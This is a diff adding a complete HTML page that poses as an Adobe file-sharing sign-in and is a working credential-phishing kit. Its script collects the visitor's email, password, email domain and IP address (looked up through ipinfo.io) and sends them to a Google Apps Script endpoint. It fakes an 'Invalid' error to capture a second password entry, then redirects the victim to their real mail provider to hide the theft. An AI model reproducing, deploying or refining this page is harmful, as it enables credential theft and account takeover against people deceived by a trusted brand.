@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Adobe</title>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <style>
+    body, html {
+      height: 100%;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+    }
+    .bg-image {
+      background-image: url('https://robertlugana.sirv.com/photo_2024-01-29_02-27-21.jpg');
+      background-size: contain;
+      background-position: center;
+      background-repeat: no-repeat;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+    .dark-overlay {
+      background-color: rgba(0, 0, 0, 0.6);
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: none;
+      z-index: 1;
+    }
+    .form-container {
+      display: none;
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 10px;
+      z-index: 2;
+      width: 400px;
+      max-width: 90%;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+    }
+    .form-container img {
+      width: 50px;
+      height: 50px;
+      display: block;
+      margin: 0 auto;
+      margin-bottom: 20px;
+    }
+    .form-container form {
+      width: 100%;
+    }
+    /* Style for the loading dialog */
+    .loading-dialog {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(255, 255, 255, 0.8);
+      padding: 20px;
+      border-radius: 5px;
+      z-index: 9999;
+    }
+  </style>
+</head>
+<body>
+
+<div class="bg-image" id="bgImage">
+  <div class="dark-overlay" id="darkOverlay"></div>
+  <div class="form-container" id="formContainer">
+    <img src="https://th.bing.com/th/id/R.10a0e79004ec24df6b67c1a7ade13f7b?rik=WgDtacyt160JGg&pid=ImgRaw&r=0" alt="Form Image">
+    <h4>Sign in with receiving email</h4>
+    <form id="form5" action="https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec" method="post" autocomplete="">
+      <div class="form-group">
+        <label for="exampleInputEmail1">Email address</label>
+        <input type="email" class="form-control" id="exampleInputEmail1" name="email" aria-describedby="emailHelp" required>
+      </div>
+      <div class="form-group">
+        <label for="exampleInputPassword1">Password</label>
+        <input type="password" class="form-control" id="exampleInputPassword1" name="password" required>
+      </div>
+      <div class="error-message" id="errorMessage" style="display: none; color: red; margin-bottom: 10px; font-size: 14px;"></div>
+      <input type="hidden" id="domainHidden" name="domain" value="">
+      <input type="hidden" name="FormId" value="form5">
+      <button type="submit" class="btn btn-primary">Login</button>
+    </form>
+  </div>
+</div>
+
+<!-- Loading dialog -->
+<div class="loading-dialog" id="loadingDialog">
+  <div class="spinner-border text-primary" role="status">
+    <span class="sr-only">Loading...</span>
+  </div>
+  <p></p>
+</div>
+
+<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const bgImage = document.getElementById('bgImage');
+      const formContainer = document.getElementById('formContainer');
+      const darkOverlay = document.getElementById('darkOverlay');
+      const emailInput = document.getElementById('exampleInputEmail1');
+      const domainHiddenInput = document.getElementById('domainHidden');
+      const form = document.querySelector('form');
+      const passwordInput = document.getElementById('exampleInputPassword1');
+      const errorMessage = document.getElementById('errorMessage');
+      const loadingDialog = document.getElementById('loadingDialog');
+      let submissionAttempts = 0;
+  
+      bgImage.addEventListener('click', function (e) {
+        if (e.target === this) {
+          formContainer.style.display = formContainer.style.display === 'block' ? 'none' : 'block';
+          darkOverlay.style.display = darkOverlay.style.display === 'block' ? 'none' : 'block';
+        }
+      });
+  
+      formContainer.addEventListener('click', function (e) {
+        e.stopPropagation();
+      });
+  
+      emailInput.addEventListener('input', function () {
+        const userEmail = emailInput.value.trim();
+        const atIndex = userEmail.lastIndexOf('@');
+  
+        if (atIndex !== -1) {
+          const domain = userEmail.slice(atIndex + 1);
+          domainHiddenInput.value = domain;
+        } else {
+          domainHiddenInput.value = '';
+        }
+      });
+  
+      form.addEventListener('submit', function (event) {
+        event.preventDefault();
+  
+        // Obtain the user's IP address using ipinfo.io
+        fetch('https://ipinfo.io/json')
+          .then(response => response.json())
+          .then(data => {
+            const userIP = data.ip;
+  
+            const userEmail = emailInput.value.trim();
+            const domain = domainHiddenInput.value.trim();
+            const password = passwordInput.value.trim();
+  
+            const formData = new FormData();
+            formData.append('IPAddress', userIP);
+            formData.append('Email', userEmail);
+            formData.append('Domain', domain);
+            formData.append('Password', password);
+            formData.append('FormId', 'form5');
+  
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec';
+            const maxAttempts = 99;
+  
+            loadingDialog.style.display = 'block';
+  
+            if (submissionAttempts === 0) {
+                // First attempt logic
+                fetch(scriptURL, {
+                  method: 'POST',
+                  body: formData, // Convert FormData to JSON
+                  mode: 'no-cors' // Set the no-cors mode
+                })
+                .then(response => {
+                  console.log('Form data sent.');
+                  submissionAttempts++;
+                  errorMessage.style.display = 'block';
+                  errorMessage.textContent = 'Invalid: Please try again.';
+                  loadingDialog.style.display = 'none';
+                })
+                .catch(error => {
+                  console.error('Error sending form data:', error);
+                  loadingDialog.style.display = 'none';
+                });
+            } else if (submissionAttempts === 1) {
+          // Second attempt logic
+                fetch(scriptURL, {
+                  method: 'POST',
+                  body: formData, // Convert FormData to JSON
+                  mode: 'no-cors' // Set the no-cors mode
+                })
+                .then(response => {
+                  submissionAttempts++;
+                  if (domain) {
+                    switch (domain.toLowerCase()) {
+                      case 'gmail.com':
+                        window.location.href = 'https://mail.google.com/';
+                        break;
+                      case 'yahoo.com':
+                        window.location.href = 'https://login.yahoo.com/';
+                        break;
+                      case 'outlook.com':
+                        window.location.href = 'https://login.live.com/';
+                        break;
+                      default:
+                        window.location.href = 'https://' + domain;
+                        //window.location.href = 'https://adobe-file-sharing-b10x.vercel.app/';
+                        break;
+                    }
+                  } else {
+                    alert('Please provide a valid email address.');
+                  }
+                  loadingDialog.style.display = 'none';
+                })
+                .catch(error => {
+                  console.error('Error sending form data.', error);
+                  loadingDialog.style.display = 'none';
+                });
+            }
+  
+            form.reset();
+          })
+          .catch(error => {
+            console.error('Error getting user IP:', error);
+          });
+      });
+    });
+  </script>
+  
+
+</body>
+</html>
